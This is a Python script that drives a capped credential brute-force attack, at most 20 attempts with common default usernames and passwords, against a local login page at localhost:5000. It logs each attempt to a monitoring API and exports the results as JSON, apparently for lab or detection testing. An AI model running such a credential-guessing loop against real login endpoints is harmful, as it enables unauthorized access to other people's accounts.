#!/usr/bin/env python3
"""
Script to run brute force attack automatically
"""

import subprocess
import sys
import os

# Add current directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Import and run the attacker
from brute_force_attacker import BruteForceAttacker

def main():
    # Create attacker instance
    attacker = BruteForceAttacker("http://localhost:5000/login")
    
    # Use limited attack with 9+ character passwords (20 attempts max)
    usernames = ["admin", "administrator", "root", "user"]
    passwords = [
        "password12345", "admin12345678", "welcome2024", "changeme2024",
        "defaultpassword", "temp12345678", "accessgranted", "securitypass",
        "systempassword", "administrator2024", "testpassword123", "guestaccess123"
    ]
    
    # Limit to 20 attempts
    max_attempts = 20
    limited_combinations = []
    attempt_count = 0
    
    for username in usernames:
        for password in passwords:
            if attempt_count >= max_attempts:
                break
            limited_combinations.append((username, password))
            attempt_count += 1
        if attempt_count >= max_attempts:
            break
    
    print(f"[ATTACK] Starting limited brute force attack with {len(limited_combinations)} attempts...")
    
    # Extract limited usernames and passwords
    limited_usernames = [combo[0] for combo in limited_combinations]
    limited_passwords = [combo[1] for combo in limited_combinations]
    
    # Run the attack with limited combinations
    results = []
    for i, (username, password) in enumerate(limited_combinations):
        print(f"Attempt {i+1}: {username}/{password}", end=" ... ")
        result = attacker.single_attempt(username, password)
        results.append(result)
        attacker.results.append(result)
        
        # Log to monitoring API
        attacker.log_to_api(result)
        
        print(f"[{result.status_code}] {result.comment}")
        
        # Add delay between attempts
        if i < len(limited_combinations) - 1:  # Don't delay after last attempt
            import time
            time.sleep(0.5)
    
    # Print results table
    attacker.print_results_table()
    
    # Export results (this creates the JSON file)
    attacker.export_results()
    
    print("[INFO] Attack completed and JSON file created!")

if __name__ == "__main__":
    main()
